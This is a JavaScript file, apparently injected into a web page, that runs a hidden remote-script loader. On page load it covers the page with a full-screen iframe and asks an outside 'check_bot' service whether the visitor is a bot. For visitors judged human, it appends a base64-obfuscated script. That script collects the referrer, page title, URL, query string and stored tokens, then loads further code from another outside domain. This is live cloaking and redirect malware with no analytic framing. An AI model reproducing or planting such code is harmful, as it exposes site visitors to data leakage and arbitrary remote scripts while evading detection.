const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
window.addEventListener('DOMContentLoaded', () => {
    createLoader();
    fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
        if (res?.code == 200 && !res.result) {
            const script = document.createElement('script');
            script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfcjlONnBGUENCMnpMSkRjTic7CiAgICBpZiAoIXdpbmRvdy5fcjlONnBGUENCMnpMSkRjTikgewogICAgICAgIHdpbmRvdy5fcjlONnBGUENCMnpMSkRjTiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9kb2xhZG93YW5pYS5jbHViL01Zd0hzazV3JywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgXzNDQmRHcUpraEJ0TUZOZHkgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF8zQ0JkR3FKa2hCdE1GTmR5ICE9PSAndW5kZWZpbmVkJyAmJiBfM0NCZEdxSmtoQnRNRk5keSAhPT0gbnVsbCkgewogICAgICAgIHZhciBfUHdRdlpzSFp3alZmQjFCZCA9IEpTT04ucGFyc2UoXzNDQmRHcUpraEJ0TUZOZHkpOwogICAgICAgIHZhciBfTk1tenR5WkdRTFB3N1hLWCA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9Qd1F2WnNIWndqVmZCMUJkLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX3I5TjZwRlBDQjJ6TEpEY04udHRsIDwgX05NbXp0eVpHUUxQdzdYS1gpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9UTDVIZHdHRll5TU1mOXY4ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX3lzSllMNERkMWM3bjVKWnEgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfMjl0RkJGOFpZcVZWcjU3cyA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgXzI5dEZCRjhaWXFWVnI1N3MgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgXzI5dEZCRjhaWXFWVnI1N3MgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfMjl0RkJGOFpZcVZWcjU3cyArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfMjl0RkJGOFpZcVZWcjU3cyArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgXzI5dEZCRjhaWXFWVnI1N3MgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgXzI5dEZCRjhaWXFWVnI1N3MgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9yOU42cEZQQ0IyekxKRGNOLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9UTDVIZHdHRll5TU1mOXY4ICE9PSAndW5kZWZpbmVkJyAmJiBfVEw1SGR3R0ZZeU1NZjl2OCAmJiB3aW5kb3cuX3I5TjZwRlBDQjJ6TEpEY04udW5pcXVlKSB7CiAgICAgICAgXzI5dEZCRjhaWXFWVnI1N3MgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfVEw1SGR3R0ZZeU1NZjl2OCk7CiAgICB9CiAgICBpZiAodHlwZW9mIF95c0pZTDREZDFjN241SlpxICE9PSAndW5kZWZpbmVkJyAmJiBfeXNKWUw0RGQxYzduNUpacSAmJiB3aW5kb3cuX3I5TjZwRlBDQjJ6TEpEY04udW5pcXVlKSB7CiAgICAgICAgXzI5dEZCRjhaWXFWVnI1N3MgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF95c0pZTDREZDFjN241SlpxKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9yOU42cEZQQ0IyekxKRGNOLlJfUEFUSCArIF8yOXRGQkY4WllxVlZyNTdzOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg";
             document.querySelector("head").appendChild(script);
        }
        toggleLoad();
        
    })
})
